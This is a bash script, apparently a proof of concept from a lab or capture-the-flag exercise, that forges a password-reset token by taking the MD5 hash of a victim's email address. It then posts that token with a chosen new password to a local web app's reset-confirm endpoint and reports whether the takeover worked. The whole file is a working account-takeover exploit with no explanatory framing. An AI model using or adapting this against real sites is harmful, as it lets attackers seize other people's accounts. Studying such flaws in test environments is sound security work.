#!/usr/bin/env bash

make_blue() {
  echo -e "\033[1;94m$1\033[1;0m"
}

make_green() {
  echo -e "\033[1;92m$1\033[1;0m"
}

token=$(printf "%s" "$1" | md5sum | awk '{ print $1 }')
domain="http://localhost:4942"
reset_link="$domain/reset-password?$1&token=$token"

location=$(curl -X POST "$domain/reset-password/confirm" \
    -s \
    -w "%{redirect_url}" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "email=$1&token=$token&new_password=$2")

if [[ $location == "$domain/login?success=Password+updated" ]]; then
    echo "$(make_green 'SUCCESS!!!') Password of $1 was changed to $2."
    echo "$location"
else
    echo "Failure. $location"
fi
